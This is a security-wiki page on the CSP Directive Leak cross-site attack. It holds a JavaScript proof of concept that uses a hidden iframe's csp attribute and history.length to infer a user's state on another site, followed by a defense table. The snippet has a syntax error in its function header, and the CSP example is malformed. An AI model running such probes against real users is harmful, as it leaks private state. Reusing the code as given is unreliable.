+++
title = "CSP leaks"
description = ""
category = "Attack"
abuse = [
    "CSP Violations",
]
defenses = [
    "SameSite Cookies"
]
menu = "main"
weight = 2
+++

## CSP Directive Leak

iframe elements have a csp attribute which specifies the [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) that an embedded document must agree to enforce upon itself. 

Without using the `Allow-CSP-From` header an embedder is not allowed to set a more restrictive policy on to an iframe,
For most directives so by trying to apply `img-src 'https://example.com';` to the iframe csp attribute it will refuse to load unless it’s only allowing images from that source this can be detected with the onload event. [Run demo](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

This can be abused if csp attrbutes are set conditionally on user state and embedding is allowed.

```javascript
async function ifResticts(url, csp='default-src \'self\';') => {
    return new Promise((r)=> {
        let i = document.createElement('iframe');
        // attempt to enforce a csp onto the iframe.
        i.setAttribute('csp', csp);
        i.src = url;
        // Hide the iframe
        i.hidden = true;
        
        // get inital history length
        let h0 = history.length;

        // max history is 50 
        if(h0 > 48){
            throw new Error('History to long')
        }

        i.onload = () => {
            // overwrite onload
            i.onload = () => {
                // the length will not increase on a page error such as when not allowed to apply a CSP.
                let h1 = history.length
                i.remove();
                return r(h1 - h0);
            }

            // reload
            i.src = url;
        }
        document.body.append(i);
    });
}
```
{{< hint info >}}
As of November 2022, Firefox doesn't support the csp attribute for an [iframe](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/csp).
{{< /hint >}}


## Defense

| [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
| :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
|                                         ✔️                                         |                         ❌                          |                                ✔️                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |
